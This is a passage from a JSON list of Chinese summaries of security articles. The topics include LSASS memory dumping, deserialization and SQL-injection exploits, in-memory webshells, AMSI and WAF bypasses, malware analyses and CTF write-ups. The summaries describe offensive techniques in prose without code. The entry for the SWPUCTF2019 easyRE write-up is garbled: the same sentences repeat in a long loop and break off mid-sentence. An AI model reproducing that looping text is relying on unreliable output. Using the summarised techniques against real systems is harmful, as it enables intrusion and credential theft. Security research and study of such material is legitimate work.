        "FileName": "12157-域渗透-一文了解lsass内存转储攻防技术.pdf"
    },
    {
        "page_content": "该文档介绍了 .NET 中的 XmlSerializer 类，它用于在 XML 字符串和对象之间进行相互转换，并提供了使用示例，包括如何序列化和反序列化对象，以及如何使用 ObjectDataProvider 和 XamlReader 进行攻击。",
        "FileName": "9592-.net反序列化之XmlSerializer.pdf"
    },
    {
        "page_content": "该文档描述了 Apache SkyWalking 中的 SQL 注入漏洞，该漏洞允许攻击者通过构造恶意 SQL 查询来执行任意代码。该漏洞是由于在预编译语句中拼接用户输入而造成的，导致 SQL 注入。攻击者可以通过查看配置文件来找到受影响的查询，然后构造恶意查询来利用该漏洞。该文档还提供了利用该漏洞的示例，包括写入文件、加载恶意类和执行反弹 shell。",
        "FileName": "9202-Apache SkyWalking SQLi to RCE.pdf"
    },
    {
        "page_content": "该文档深入分析了智能合约重入漏洞的成因和预防机制。重入漏洞是由于合约函数在执行过程中被外部调用而导致的，攻击者可以利用此漏洞多次执行函数，从而窃取合约中的资金。文档建议使用 checks-effects-interactions 模式、互斥锁或 OpenZeppelin 的 ReentrancyGuard 合约来防止重入漏洞。",
        "FileName": "9903-深入智能合约重入漏洞.pdf"
    },
    {
        "page_content": "本文探讨了软件物料清单 (SBOM) 在云原生应用安全治理中的重要性。SBOM 是软件组件的清单，可帮助组织识别和管理第三方组件中的漏洞和风险。通过实施 SBOM，组织可以提高软件供应链的透明度，减轻软件供应链攻击的威胁，并增强云原生应用的安全性。",
        "FileName": "12604-KCD技术分享：以SBOM为基础的云原生应用安全治理.pdf"
    },
    {
        "page_content": "该文档分析了 Oracle WebLogic CVE-2022-21350 漏洞，这是一个反序列化漏洞，可能导致低版本 JDK 中的 RCE 风险。该漏洞涉及一系列方法调用，包括 BadAttributeValueExpException.readObject、SessionData.toString 和 BusinessHandleImpl.getBusinessObject，最终导致通过 ctx.lookup 方法进行 JNDI 注入。Oracle 已发布补丁来修复此漏洞，建议及时更新。",
        "FileName": "10920-Oracle WebLogic CVE-2022-21350 漏洞分析.pdf"
    },
    {
        "page_content": "该文档记录了一次网络渗透测试，攻击者通过获取Weblogic服务器的管理员权限，利用内存马注入获取webshell，并通过进程注入上线另一个会话。随后，攻击者利用服务器令牌尝试上线其他机器，并对内网进行信息收集和密码喷洒，但未取得显著成果。攻击者还扫描了内网，发现了ms17-010漏洞，但无法利用。最终，攻击者发现了一个数据库备份配置文件，但无法连接或爆破成功。",
        "FileName": "12570-一次平平无奇的内网记录.pdf"
    },
    {
        "page_content": "该文档分析了基于 Tomcat 的内存 Webshell 无文件攻击技术，该技术通过动态注册一个 Filter，并将其放到最前面，从而实现一个内存级的 Webshell，解决了非 Spring 框架 Web 应用无法使用 Webshell 的问题。",
        "FileName": "7388-基于tomcat的内存 Webshell 无文件攻击技术.pdf"
    },
    {
        "page_content": "该文档介绍了 Xmind 2020 中的 XSS 漏洞，该漏洞可导致命令执行。该漏洞允许攻击者通过在主题中插入恶意代码来触发 XSS，然后在用户打开大纲页面时执行命令。该漏洞的利用过程简单，影响范围广泛，危害严重，可用于执行任意命令，包括上线 CS。",
        "FileName": "9559-Xmind 2020 XSS漏洞导致命令执行复现.pdf"
    },
    {
        "page_content": "该文档分析了 Gamaredon 组织的一个恶意软件样本，该样本使用宏模板、VBS 脚本和 SFX 文件来感染系统，修改注册表，复制文件并执行恶意代码。恶意软件通过 XMLHTTP 访问远程服务器，并使用混淆代码和特征混淆技术来逃避检测。",
        "FileName": "7444-Gamaredon组织某样本分析.pdf"
    },
    {
        "page_content": "该文档主要讨论了 glibc2.32 中引入的 safe-linking 机制，该机制通过对 tcache 和 fastbin 的 next 指针进行运算，增加了指针劫持的难度。文档还提供了绕过 safe-linking 机制的步骤，包括泄露堆地址、libc 基地址和 free_hook 地址，然后利用这些信息修改 free_hook 指针，最终执行任意代码。",
        "FileName": "12695-safe-linking.pdf"
    },
    {
        "page_content": "该文档介绍了如何绕过某系统 Oracle+ 盲注中的 WAF，通过使用协议未覆盖绕过防火墙，成功检测到注入并绕过 Oracle 权限问题。",
        "FileName": "8651-某系统Oracle+盲注Bypass.pdf"
    },
    {
        "page_content": "Java 反序列化漏洞利用 Java 反射机制和 URLDNS 链，通过修改 HashMap 中 URL 对象的 hashCode 属性，绕过 if 语句，在反序列化时触发 URLStreamHandler 类中的 hashCode 函数，发送 DNS 请求，实现 SSRF 攻击。",
        "FileName": "12667-Java反序列化之反射&URLDNS链审计.pdf"
    },
    {
        "page_content": "该文档介绍了对 XDCMS 3.0.1 的代码审计，重点关注其安全过滤函数、SQL 注入漏洞、任意文件删除漏洞和文件上传漏洞。审计发现，safe_replace() 函数存在绕过，safe_html() 函数可被利用进行报错注入，unlink() 函数可用于任意目录文件删除，而文件上传点存在后缀限制绕过，可用于上传木马获取 shell。",
        "FileName": "9272-新手入门代码审计(1)--xdcms-3.0.1.pdf"
    },
    {
        "page_content": "本文分析了 PHP 中 `file_get_contents` 和 `curl_exec` 函数在处理文件读取时的不同行为，重点关注了它们对文件名的解析方式。`file_get_contents` 严格遵循 URL 规范，将文件名视为资源名，而 `curl_exec` 则省略了文件名中的查询字符串和片段部分。这种差异导致了在处理 `file://` 协议时，`file_get_contents` 无法读取文件，而 `curl_exec` 则可以。",
        "FileName": "7112-浅析SSRF与文件读取的一些小特性.pdf"
    },
    {
        "page_content": "该文档分析了 ret2resolve 技术在 x86 和 x64 架构下的原理和利用方法，重点介绍了如何通过修改动态链接库的结构（如 .dynamic、.dynsym、.rel.plt）来劫持程序流。文档还提供了具体的示例代码和利用步骤，说明了如何利用 ret2resolve 技术在不同的安全机制下获取代码执行权限。",
        "FileName": "12271-ret2resolve深入分析—以x86、x64视角.pdf"
    },
    {
        "page_content": "本文档介绍了在内网渗透中如何通过令牌窃取快速获取域控权限，并通过信息收集和后门植入来维持对域控的长期控制。该文档强调了内网渗透的本质是信息收集，并提供了多种方法来梳理域内信息，包括使用BloodHound、csvde和spn查询。",
        "FileName": "9816-一次小型 APT 持久潜伏内网域渗透（上）.pdf"
    },
    {
        "page_content": "该文档分析了 Windows 内核中 HEVD 堆栈溢出漏洞，并提供了利用该漏洞在 Windows 7 SP1 x86 系统上执行任意代码的完整 Exploit。",
        "FileName": "9772-Windows Kernel Exploitation Notes(一)——HEVD Stack Overflow.pdf"
    },
    {
        "page_content": "该文档分析了 Anubis 恶意软件家族的一个样本，该样本通过 APK 拦截规则被截获。样本于 2023-08-28 00:55:06 UTC 编译和上传，包含多种危险行为，包括上传位置信息、删除短信、下载文件、开始屏幕录制、上传截屏文件、开始录音、键盘注入、上传联系人信息、发送短信、上传已安装应用列表、开启无障碍服务、创建对话框弹窗、发起特定通知、申请定位权限、创建 socket 服务、发送垃圾邮件、开启应用、上传键盘记录信息、开始远程命令执行、开始呼叫转移、打开 URL、加密/解密密钥和上传网络定位经纬度。",
        "FileName": "12825-Anubis恶意软件家族样本分析.pdf"
    },
    {
        "page_content": "该文档介绍了 Windows 反恶意软件扫描接口 (AMSI) 的工作原理，它是一种通用接口标准，允许应用程序与计算机上的任何反恶意软件产品集成。AMSI 通过扫描缓冲区和字符串来查找恶意软件迹象，并在 PowerShell 启动时加载到内存中。通过修改 AmsiOpenSession 函数的汇编指令，可以绕过 AMSI 扫描，从而逃避反恶意软件的检查。",
        "FileName": "10010-Powershell调用AMSI分析.pdf"
    },
    {
        "page_content": "ThinkPHP 最新 RCE 漏洞（QVD-2022-46174）利用多语言模式和文件包含，允许攻击者通过在 lang 参数中输入 payload 来执行任意代码。该漏洞源于 loadLangPack 函数中对传参的过滤和限制不足，导致攻击者可以构造恶意文件路径并触发文件包含。",
        "FileName": "11940-ThinkPHP 最新rce(QVD-2022-46174)复现和分析.pdf"
    },
    {
        "page_content": "该文档描述了作者对某专属网商进行逻辑漏洞挖掘的过程，发现了两个漏洞：任意密码重置和越权。通过猜测测试用户手机号码，作者成功重置了密码，并通过修改参数获取了 20 万条客户数据。",
        "FileName": "8078-对某专属厂商的逻辑漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档深入探讨了防火墙配置，包括探测出站规则未禁用的端口、配置出站规则禁止特定端口出站、通过ICMP协议出网、关闭防火墙、自定义防火墙日志位置、查看防火墙配置的所有规则、添加出站端口、流量转发、Linux防火墙配置、探测防火墙出网等内容。",
        "FileName": "7615-防火墙深入总结.pdf"
    },
    {
        "page_content": "该文档介绍了一种在极限环境中使用 certutil 和 PowerShell 配合 Burp 快速落地文件的技术。通过使用 PowerShell 的爆破模块单线程写入文件，并结合 certutil 的解码功能，可以轻松解决在某些环境中 echo 写入文件时出现空格和 URL 编码问题，从而高效地落地文件。",
        "FileName": "8345-极限环境使用certutil+PowerShell配合Burp快速落地文件.pdf"
    },
    {
        "page_content": "该文档分析了 .NET 系统的审计，重点关注其逻辑缺陷、SQL 注入和任意文件上传漏洞。通过反编译和代码分析，作者发现了一个逻辑缺陷，允许攻击者通过修改响应包中的字段来提升权限。此外，作者还发现了由于 iBatis 框架配置不当而导致的 SQL 注入漏洞，以及由于缺乏文件类型过滤而导致的任意文件上传漏洞。",
        "FileName": "11029-记对某.net系统的审计.pdf"
    },
    {
        "page_content": "本文分析了 OpenRASP 中类加载机制的原理，重点关注了 Agent 和 Engine 之间的关联。OpenRASP 通过获取扩展类加载器来加载 Engine，从而实现类加载隔离。这种实现方式既有优点，如无需反射即可直接调用检测代码，也有缺点，如可能导致类冲突。文章还提出了通过应用类加载器加载 Engine 的替代方案，以实现完全的加载器隔离，但会带来性能损耗。",
        "FileName": "8148-以OpenRASP为基础-展开来港港RASP的类加载.pdf"
    },
    {
        "page_content": "该文档探讨了 CTF 技能宝典中的智能合约重入漏洞，重点介绍了 2019 年强网杯 babybank 题目的解题思路。该漏洞利用了 withdraw 函数中的 call.value() 方法，允许攻击者通过循环取币来触发重入漏洞，从而满足 payforflag 函数中 balance[msg.sender] >= 10000000000 的判断条件，最终获取 flag。",
        "FileName": "8937-CTF技能宝典之智能合约#重入漏洞.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 SQL 注入漏洞从 SQL 服务器连接到远程桌面协议 (RDP) 端口 3389，包括判断字符和数字类型、判断是否为站库分离、获取数据库信息、获取表名和列名、获取任意表中的列名、获取用户信息、执行操作系统命令、上传文件、提权、连接 RDP 等步骤。",
        "FileName": "8561-从sql注入到连接3389.pdf"
    },
    {
        "page_content": "文档主题是反射机制，内容是介绍了反射机制的原理、相关类和方法，以及如何使用反射机制操作属性和方法。",
        "FileName": "12636-反序列化基础之反射机制.pdf"
    },
    {
        "page_content": "该文档提供了关闭中国移动、中国联通和中国电信的手机号码一键登录业务的详细步骤。它介绍了每个运营商的业务名称、归属部门和关闭方法，包括联系客服、拨打热线或提供特定信息。该文档旨在帮助用户保护他们的账户安全，防止未经授权的访问。",
        "FileName": "12900-如何关闭手机号码一键登录业务.pdf"
    },
    {
        "page_content": "CVE-2019-2215 复现过程记录文档主要介绍了 CVE-2019-2215 漏洞的复现过程，包括漏洞的主题和内容。漏洞描述：使用 epoll 的进程在调⽤ BINDER_THREAD_EXIT 结束 binder 线程时会释放 binder_thread 结构体，然后在程序退出或调⽤ EPOLL_CTL_DEL 时会遍历已释放结构体 binder_thread 中的 wait 链表进⾏链表删除操作。问题在于，当程序退出或调⽤ epoll 的清理操作时，此时访问的 wait 链表位于已释放的 binder_thread 结构体中， uaf 产⽣。利⽤这些信息可以进⼀步达到内核任意地址读写甚⾄提权等操作。",
        "FileName": "9273-CVE-2019-2215复现过程记录.pdf"
    },
    {
        "page_content": "文档分析了智能合约中的整数溢出漏洞，并以 2018 年 WCTF 上的 BelluminarBank 题⽬为例，详细介绍了如何利用整数溢出、变量覆盖和权限设置等漏洞攻击转出合约所有余额。",
        "FileName": "9007-零时科技丨CTF技能宝典之智能合约#整数溢出漏洞.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何通过信息收集和利用已知漏洞来挖掘教育机构网站的漏洞。作者通过收集子域名和 C 段 IP 地址，最终发现了一个存在 SQL 注入和远程命令执行 (RCE) 漏洞的网站。通过利用这些漏洞，作者成功获取了数据库名称并执行了命令，从而获得了高危漏洞。",
        "FileName": "10310-记如何简单的挖掘edusrc.pdf"
    },
    {
        "page_content": "DNS 重绑定攻击是一种利用 DNS 缓存机制绕过 SSRF 限制的攻击技术，通过控制 DNS 查询请求的间隔低于 TTL 值，确保两次查询的结果一致，从而实现对内网资源的访问。该攻击的局限性在于时间窗口问题、DNS 缓存机制和应用环境问题，但可以通过修改 Linux 系统默认 TTL 值为 10 来解决。",
        "FileName": "7495-从0到1认识DNS重绑定攻击.pdf"
    },
    {
        "page_content": "**主题：** CVE-2022-26134 Confluence OGNL RCE 漏洞分析\n\n**内容：** 该漏洞允许未经身份验证的远程攻击者通过构造 OGNL 表达式在 Confluence Server 或 Data Center 上执行任意代码。漏洞分析涉及设置漏洞环境、配置远程调试、分析请求处理流程和 OGNL 表达式解析，并提供绕过沙箱限制的技巧。建议升级到安全版本或采取缓解措施，例如启用 Crowd 单点认证。",
        "FileName": "11436-CVE-2022-26134 Confluence OGNL RCE 漏洞分析.pdf"
    },
    {
        "page_content": "本文档介绍了安卓系统中检测 root 权限的常见手段，包括特征遍历、尝试执行 root 后操作、读取手机编译版本和调试状态、root 检测指纹、检查危险属性、检查读写路径、检测测试密钥、检查 Buildprop 值、检查 su 存在、检查 root 原生层和检测 Magisk 二进制文件。",
        "FileName": "12891-安卓root检测常见手段.pdf"
    },
    {
        "page_content": "**主题：** Laravel 5.4 序列化导致远程代码执行 (RCE) 漏洞分析\n\n**内容：**\n该文档分析了 Laravel 5.4 框架中的一个序列化漏洞，该漏洞允许攻击者通过序列化对象来执行任意代码。文档详细介绍了漏洞的利用过程，包括环境搭建、利用点识别、构造触发器和利用成功。它还提供了攻击流程和调用栈的详细信息，并总结了漏洞的利用方法。",
        "FileName": "9206-laravel-5.4-序列化导致rce.pdf"
    },
    {
        "page_content": "该文档主要分析了熊海 cmsv1.0 代码中的安全漏洞，包括文件包含、越权访问、SQL 注入、XSS 和 CSRF 漏洞。文档详细介绍了每个漏洞的利用方法和影响，并提供了相应的修复建议。",
        "FileName": "10393-熊海cmsv1.0代码审计.pdf"
    },
    {
        "page_content": "该文档介绍了如何绕过安全狗 SQL 注入检测，它提供了详细的步骤和示例，说明如何使用换行符、注释和正则表达式来绕过安全狗的规则，从而执行 SQL 注入攻击。",
        "FileName": "10479-SQL注入bypass最新版安全狗.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用施耐德电气 EcoStruxure Operator Terminal Expert 软件中的两个漏洞，通过执行 SQL 操作诱导软件加载攻击者提供的 DLL，从而在打开项目文件时触发任意代码执行攻击。",
        "FileName": "8282-深入分析施耐德工控软件代码执行漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 Kong API Gateway 中的未授权访问漏洞 (CVE-2020-11710)，该漏洞是由不当配置导致的，允许攻击者访问 Admin Restful API，从而管理 Kong Gateway 的全部功能，包括信息泄露、SSRF 和 MITM 攻击。文档还提供了检测和修复漏洞的方法，强调了不当配置导致漏洞的风险，尤其是在云环境中。",
        "FileName": "7631-漏洞分析 - Kong未授权访问漏洞(CVE-2020-11710).pdf"
    },
    {
        "page_content": "该文档详细介绍了在内网渗透中获取域控权限的步骤，包括利用 Linux 提权辅助工具、SUID 提权、Sudo 配置错误、CVE-2020-1472 漏洞、横向移动和扩大利益等技术。",
        "FileName": "10627-内网渗透初探(三)  查缺补漏.pdf"
    },
    {
        "page_content": "本文讲述了作者对一款名为“压枪神器”的PUBG外挂病毒进行反制的过程。作者通过分析病毒行为发现其是一个加密狗USB，并通过对病毒交互的IP地址进行探测，获得了病毒服务器的IP地址。随后，作者利用PHPmyadmin数据库导出功能导出了一句话PHP，并通过Mimikatz工具抓取了用户登录密码，最终成功拿到了病毒服务器的系统权限。",
        "FileName": "7626-记一次对PUBG外挂病毒的反制过程.pdf"
    },
    {
        "page_content": "EPF 是一款基于 Python 编写的模糊测试工具，它利用代码插桩和覆盖率引导来对网络协议进行模糊测试。该工具通过预处理阶段（包括程序插桩、数据包建模、状态转换建模和遗传种群构造）和动态分析阶段（包括执行引擎、主循环和输入生成器）来实现模糊测试。EPF 采用基于种群的模拟退火算法，对资源进行分配和覆盖率最大化，从而提高模糊测试的效率和有效性。",
        "FileName": "10889-EPF：一种基于进化、协议感知和覆盖率引导的网络协议FUZZER.pdf"
    },
    {
        "page_content": "本文档介绍了如何将 JSP 一句话 shell 移植到蚁剑中，通过利用动态二进制加密实现新型一句话木马，从而实现 JSP 一句话 shell 的动态秘钥编码器解码器功能。该方法通过硬编码 payload 和传递其他参数的方式实现，解决了传统 JSP shell 体积庞大、特征明显的问题，并支持中文路径和 base64 编码。",
        "FileName": "7491-蚁剑改造计划之实现JSP一句话.pdf"
    },
    {
        "page_content": "本文总结了离线解密 Windows 凭证的常见方法，包括使用任务管理器、mimikatz、Procdump、SQLDumper、rundll32、powershell 脚本、SharpDump、nanodump 和 MiniDumpWriteDump。这些方法可以导出凭据哈希，然后使用离线工具进行解密，从而绕过 Mimikatz 的反病毒签名检测。",
        "FileName": "11040-离线解密windows凭证的常见方式总结.pdf"
    },
    {
        "page_content": "CVE-2022-0847（脏管道漏洞）利用 Linux 内核中未初始化的变量漏洞，允许普通用户通过 splice() 函数将任意数据写入只读文件，从而覆盖文件内容。该漏洞影响 Linux 5.8 及更高版本，可导致本地提权或容器镜像破坏。",
        "FileName": "11463-CVE-2022-0847：脏管道漏洞分析及对容器的影响.pdf"
    },
    {
        "page_content": "该文档分析了 SWPUCTF2019 easyRE 靶机的调试过程和解题思路。通过对 main 函数的分析，发现程序存在调试检测，通过 nop 掉 jmp 实现正常调试。随后对 sub_401FE0 函数进行分析，发现存在一个虚函数表，并对内存进行赋值。接着对 sub_40F150 函数进行分析，发现存在 flag 校验，条件成立才能输出 Congratulations。最后对 sub_4024B0 函数进行分析，发现存在一个校验 flag 格式的函数，通过对字符串进行异或运算得到一个正则表达式，可以得到 flag 的格式。通过对 sub_402500 函数的分析，发现存在一个校验 flag 是否符合格式的函数，通过对 s 和 s2 两个字符串进行异或运算得到一个正则表达式，可以得到 flag 的格式。最后对 sub_402A00 函数进行分析，发现存在一个校验 flag 是否符合格式的函数，通过对 this[52] 和 this[12] 进行比较，得到一个需要比较的结果。通过对 sub_4026E0 函数的分析，发现存在一个处理函数，通过对 v13、v14、v15、v16、v17、v18 六个变量进行赋值，并对 v13 进行循环处理，得到三个结果，并对三个结果进行比较，得到一个最终结果。通过对 sub_4028A0 函数的分析，发现存在一个处理函数，通过对 v15 进行循环处理，得到两个结果，并对两个结果进行比较，得到一个最终结果。通过对 sub_402DC0 函数的分析，发现存在一个处理函数，通过对 v17 进行循环处理，得到一个结果。通过对 sub_402730 函数的分析，发现存在一个处理函数，通过对 v13 进行循环处理，得到三个结果。通过对 sub_402A00 函数的分析，发现存在一个校验 flag 是否符合格式的函数，通过对 this[52] 和 this[12] 进行比较，得到一个需要比较的结果。通过对 sub_4026E0 函数的分析，发现存在一个处理函数，通过对 v13、v14、v15、v16、v17、v18 六个变量进行赋值，并对 v13 进行循环处理，得到三个结果，并对三个结果进行比较，得到一个最终结果。通过对 sub_4028A0 函数的分析，发现存在一个处理函数，通过对 v15 进行循环处理，得到两个结果，并对两个结果进行比较，得到一个最终结果。通过对 sub_402DC0 函数的分析，发现存在一个处理函数，通过对 v17 进行循环处理，得到一个结果。通过对 sub_402730 函数的分析，发现存在一个处理函数，通过对 v13 进行循环处理，得到三个结果。通过对 sub_402A00 函数的分析，发现存在一个校验 flag 是否符合格式的函数，通过对 this[52] 和 this[12] 进行比较，得到一个需要比较的结果。通过对 sub_4026E0 函数的分析，发现存在一个处理函数，通过对 v13、v14、v15、v16、v17、v18 六个变量进行赋值，并对 v13 进行循环处理，得到三个结果，并对三个结果进行比较，得到一个最终结果。通过对 sub_4028A0 函数的分析，发现存在一个处理函数，通过对 v15 进行循环处理，得到两个结果，并对两个结果进行比较，得到一个最终结果。通过对 sub_402DC0 函数的分析，发现存在一个处理函数，通过对 v17 进行循环处理，得到一个结果。通过对 sub_402730 函数的分析，发现存在一个处理函数，通过对 v13 进行循环处理，得到三个结果。通过对 sub_402A00 函数的分析，发现存在一个校验 flag 是否符合格式的函数，通过对 this[52] 和 this[12] 进行比较，得到一个需要比较的结果。通过对 sub_4026E0 函数的分析，发现存在一个处理函数，通过对 v13、v14、v15、v16、v17、v18 六个变量进行赋值，并对 v13 进行循环处理，得到三个结果，并对三个结果进行比较，得到一个最终结果。通过对 sub_4028A0 函数的分析，发现存在一个处理函数，通过对 v15 进行循环处理，得到两个结果，并对两个结果进行比较，得到一个最终结果。通过对 sub_402DC0 函数的分析，发现存在一个处理函数，通过对 v17 进行循环处理，得到一个结果。通过对 sub_402730 函数的分析，发现存在一个处理函数，通过对 v13 进行循环处理，得到三个结果。通过对 sub_402A00 函数的分析，发现存在一个校验 flag 是否符合格式的函数，通过对 this[52] 和 this[12] 进行比较，得到一个需要比较的结果。通过对 sub_4026E0 函数的分析，发现存在一个处理函数，通过对 v13、v14、v15、v16、v17、v18 六个变量进行赋值，并对 v13 进行循环处理，得到三个结果，并对三个结果进行比较，得到一个最终结果。通过对 sub_4028A0 函数的分析，发现存在一个处理函数，通过对 v15 进行循环处理，得到两个结果，并对两个结果进行比较，得到一个最终结果。通过对 sub_402DC0 函数的分析，发现存在一个处理函数，通过对 v17 进行循环处理，得到一个结果。通过对 sub_402730 函数的分析，发现存在一个处理函数，通过对 v13 进行循环处理，得到三个结果。通过对 sub_402A00 函数的分析，发现存在一个校验 flag 是否符合格式的函数，通过对 this[52] 和 this[12] 进行比较，得到一个需要比较的结果。通过对 sub_4026E0 函数的分析，发现存在一个处理函数，通过对 v13、v14、v15、v16、v17、v18 六个变量进行赋值，并对 v13 进行循环处理，得到三个结果，并对三个结果进行比较，得到一个最终结果。通过对 sub_4028A0 函数的分析，发现存在一个处理函数，通过对 v15 进行循环处理，得到两个结果，并对两个结果进行比较，得到一个最终结果。通过对 sub_402DC0 函数的分析，发现存在一个处理函数，通过对 v17 进行循环处理，得到一个结果。通过对 sub_402730 函数的分析，发现存在一个处理函数，通过对 v13 进行循环处理，得到三个结果。通过对 sub_402A00 函数的分析，发现存在一个校验 flag 是否符合格式的函数，通过对 this[52] 和 this[12] 进行比较，得到一个需要比较的结果。通过对 sub_4026E0 函数的分析，发现存在一个处理函数，通过对 v13、v14、v15、v16、v17、v18 六个变量进行赋值，并对 v13 进行循环处理，得到三个结果，并对三个结果进行比较，得到一个最终结果。通过对 sub_4028A0 函数的分析，发现存在一个处理函数，通过对 v15 进行循环处理，得到两个结果，并对两个结果进行比较，得到一个最终结果。通过对 sub_402DC0 函数的分析，发现存在一个处理函数，通过对 v17 进行循环处理，得到一个结果。通过对 sub_402730 函数的分析，发现存在一个处理函数，通过对 v13 进行循环处理，得到三个结果。通过对 sub_402A00 函数的分析，发现存在一个校验 flag 是否符合格式的函数，通过对 this[52] 和 this[12] 进行比较，得到一个需要比较的结果。通过对 sub_4026E0 函数的分析，发现存在一个处理函数，通过对 v13、v14、v15、v16、v17、v18 六个变量进行赋值，并对 v13 进行循环处理，得到三个结果，并对三个结果进行比较，得到一个最终结果。通过对 sub_4028A0 函数的分析，发现存在一个处理函数，通过对 v15 进行循环处理，得到两个结果，并对两个结果进行比较，得到一个最终结果。通过对 sub_402DC0 函数的分析，发现存在一个处理函数，通过对 v17 进行循环处理，得到一个结果。通过对 sub_402730 函数的分析，发现存在一个处理函数，通过对 v13 进行",
        "FileName": "10771-【SWPUCTF2019】 easyRE 详细分析过程及解题脚本.pdf"
    },
    {
        "page_content": "该文档记录了作者在渗透测试中发现内网存在大量目标机器的过程。作者通过收集信息、测试弱口令、利用反序列化漏洞获取 shell、扫描内网 IP、上传代理脚本、扫描永恒之蓝漏洞和扫描开放 80 端口的机器等步骤，逐步渗透内网，最终获得了 200 多个内网 IP 的控制权。",
        "FileName": "8624-web渗透之发现内网有大鱼.pdf"
    },
    {
        "page_content": "该文档分析了 Struts2-004 漏洞，这是一个影响 Struts 2 框架的目录遍历漏洞。该漏洞允许攻击者通过 URL 编码绕过文件路径过滤，从而访问受限目录和文件。文档提供了漏洞的详细信息，包括影响版本、漏洞环境和修复方法。",
        "FileName": "7967-Java代码审计之Struts2-004(四).pdf"
    },
    {
        "page_content": "该文档记录了一次对一个未知网站的渗透测试，其中涉及爆破登录、枚举用户名、爆破脚本文件、分析手册文档、利用默认密码、发现上传功能、利用SQL注入漏洞、尝试获取管理员密码、最终通过上传ASP文件获取WebShell。",
        "FileName": "8595-记一次短板打点.pdf"
    },
    {
        "page_content": "本文探讨了 eBPF 和基于函数的更细粒度内核运行时安全检测方案 KRSI（Kernel Runtime Security Instrumentation），该方案通过将 eBPF 程序挂载到内核安全挂钩点上，实现对内核事件的细粒度监控和检测，从而增强内核运行时安全性，弥补了传统内核安全机制的不足。",
        "FileName": "11636-【云攻防系列】玩转eBPF---关于内核运行时安全的那些事儿.pdf"
    },
    {
        "page_content": "该文档介绍了如何设置 Java 安全学习环境，包括创建 Java 项目、配置 Tomcat 中间件、编写 Servlet 和反序列化 Webdemo，并使用 ysoserial 的 CC1 漏洞生成 payload 以执行命令。",
        "FileName": "9013-Java安全01-Idea和漏洞demo.pdf"
    },
    {
        "page_content": "CVE-2020-26217 漏洞影响 XStream 1.4.13 及以下版本，绕过了之前的补丁，允许远程代码执行。该漏洞利用了一个新的绕过技术，通过一个黑名单之外的 gadget，成功绕过补丁，导致远程命令执行。",
        "FileName": "8526-CVE-2020-26217 XStream远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了三个任意文件读取漏洞 CTF 题目，分别利用了 php:// 协议、nginx 错误配置和 Flask 模板注入，通过访问特定 URL 或修改 cookie 来读取受保护的文件，从而获取 flag。",
        "FileName": "12215-CTFer成长之路之任意文件读取漏洞.pdf"
    },
    {
        "page_content": "**漏洞威胁分析报告（上册）**\n\n该文档分析了2020年漏洞威胁情报，重点关注企业资产面临的漏洞威胁和深信服漏洞闭环体系建设。报告指出，定制化业务仍然是最常被攻破的目标，企业资产所面临的可利用漏洞威胁依旧是定制化业务为主，占70.7%；组件漏洞的快速响应依旧是值得企业关注的重点。报告还分析了2020年高危漏洞，反思漏洞威胁应对措施，为企业提供可靠且具针对性的安全建议。",
        "FileName": "9285-漏洞威胁分析报告（上册）- 不同视角下的漏洞威胁.pdf"
    },
    {
        "page_content": "该文档分析了 jspxcms 历史漏洞，包括 XSS、SSRF 和 RCE，并提供了复现步骤和利用方法。它强调了在代码审计中识别敏感函数和依赖包版本的重要性，并提供了利用 Shiro-721 和文件上传漏洞进行 RCE 的示例。",
        "FileName": "10891-jspxcms历史漏洞分析与复现-JAVA.pdf"
    },
    {
        "page_content": "本文分析了crowdstrike团队的pwn2own-tale-of-a-bug-found-and-lost-again文章，梳理了漏洞模式并探讨了漏洞利用方法。文章重点介绍了Western Digital My Cloud Pro系列PR4100 NAS认证前RCE漏洞分析与利用，包括攻击面枚举、漏洞分析、漏洞利用模式和利用方法。",
        "FileName": "9169-sakuraの从零开始のIoT漏洞挖掘系列(一) Western Digital My Cloud Pro系列PR4100 NAS认证前RCE漏洞分析与利用.pdf"
    },
    {
        "page_content": "本文探讨了通过在 SVG <animate> 标签的 values 属性中插入 JavaScript URL 来绕过 WAF 的 XSS 攻击媒介。作者展示了如何利用 keyTimes 和 fill 属性来确保恶意负载在动画结束时始终可见，并讨论了使用 HTML 编码和 ASCII 值来进一步绕过 WAF 规则。",
        "FileName": "7612-animate(动画)标签的xss利用.pdf"
    },
    {
        "page_content": "狂⾬ CMS 存在后台⽂件包含、SQL 代码执⾏和数据泄露漏洞，攻击者可利⽤这些漏洞获取服务器权限或泄露敏感信息。漏洞成因在于后台模板功能未对上传⽂件进⾏过滤，导致攻击者可上传恶意⽂件并包含在模板中；SQL 代码执⾏漏洞源于后台未对 SQL 语句进⾏限制，攻击者可执⾏任意 SQL 语句；数据泄露漏洞则是因为后台提供了数据库备份功能，攻击者可通过爆破⽂件名的方式下载备份⽂件，从而获取数据库信息。",
        "FileName": "7486-狂雨cms代码审计：后台文件包含getshell.pdf"
    },
    {
        "page_content": "该文档主要介绍了 7 个 CTF 靶场题目的解题思路和方法，涉及 SQL 注入、文件包含、堆叠注入等漏洞类型，并提供了详细的解题步骤和 payload 构造方法。",
        "FileName": "12190-buuctf Web 上.pdf"
    },
    {
        "page_content": "该文档分析了 Spring 框架中内存马的注入技术，重点关注如何通过修改 AbstractHandlerMapping 的 adaptedInterceptors 变量来注册恶意拦截器。通过注入恶意拦截器，攻击者可以执行任意命令，从而获得对目标系统的控制。文档还提供了如何指定注入内存马路径的示例代码，以及如何使用 MappedInterceptor 类来实现这一目标。",
        "FileName": "11039-Spring Interceptor 内存马分析.pdf"
    },
    {
        "page_content": "该文档分析了 Moodle 中的未授权远程代码执行漏洞 (CVE-2021-36394)，该漏洞存在于 Shibboleth 认证模块中，允许攻击者通过反序列化链和会话文件写入来执行任意代码。该漏洞影响 Moodle 3.11、3.10 至 3.10.4、3.9 至 3.9.7 及更早版本，需要启用 Shibboleth 认证模块才能利用。",
        "FileName": "10383-Moodle 未授权远程代码执行分析（CVE-2021-36394）.pdf"
    },
    {
